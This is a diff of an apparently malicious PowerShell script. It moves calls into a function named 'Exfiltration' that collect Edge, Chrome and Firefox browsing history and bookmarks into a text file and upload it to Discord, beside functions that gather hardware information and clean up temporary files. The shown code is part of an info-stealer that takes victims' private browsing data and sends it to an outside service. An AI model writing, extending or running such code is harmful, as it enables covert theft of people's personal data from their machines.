@@ -73,7 +73,12 @@ function Exfiltration {
     HardwareInfo
 
     #Call GrabBrowserData
-    GrabBrowserData
+    GrabBrowserData -Browser "edge" -DataType "history" | Out-File -Append -FilePath "BrowserData.txt"
+    GrabBrowserData -Browser "edge" -DataType "bookmarks" | Out-File -Append -FilePath "BrowserData.txt"
+    GrabBrowserData -Browser "chrome" -DataType "history" | Out-File -Append -FilePath "BrowserData.txt"
+    GrabBrowserData -Browser "chrome" -DataType "bookmarks" | Out-File -Append -FilePath "BrowserData.txt"
+    GrabBrowserData -Browser "firefox" -DataType "history" | Out-File -Append -FilePath "BrowserData.txt"
+    Upload-Discord -file "BrowserData.txt" -text "Browser Data:"
 
 
     
@@ -522,22 +527,9 @@ function GrabBrowserData {
             }
         }
     } 
-
-
-# Travailler dans le répertoire C:\temp
-Set-Location -Path C:\temp
-
-# Appels à la fonction GrabBrowserData
-GrabBrowserData -Browser "edge" -DataType "history" | Out-File -Append -FilePath "BrowserData.txt"
-GrabBrowserData -Browser "edge" -DataType "bookmarks" | Out-File -Append -FilePath "BrowserData.txt"
-GrabBrowserData -Browser "chrome" -DataType "history" | Out-File -Append -FilePath "BrowserData.txt"
-GrabBrowserData -Browser "chrome" -DataType "bookmarks" | Out-File -Append -FilePath "BrowserData.txt"
-GrabBrowserData -Browser "firefox" -DataType "history" | Out-File -Append -FilePath "BrowserData.txt"
-
-# Appel à la fonction Upload-Discord
-Upload-Discord -file "BrowserData.txt" -text "Browser Data:"
-
 }
+
+
 
 # Function to delete the temporary directory and create a zip archive
 function DelTempDir {
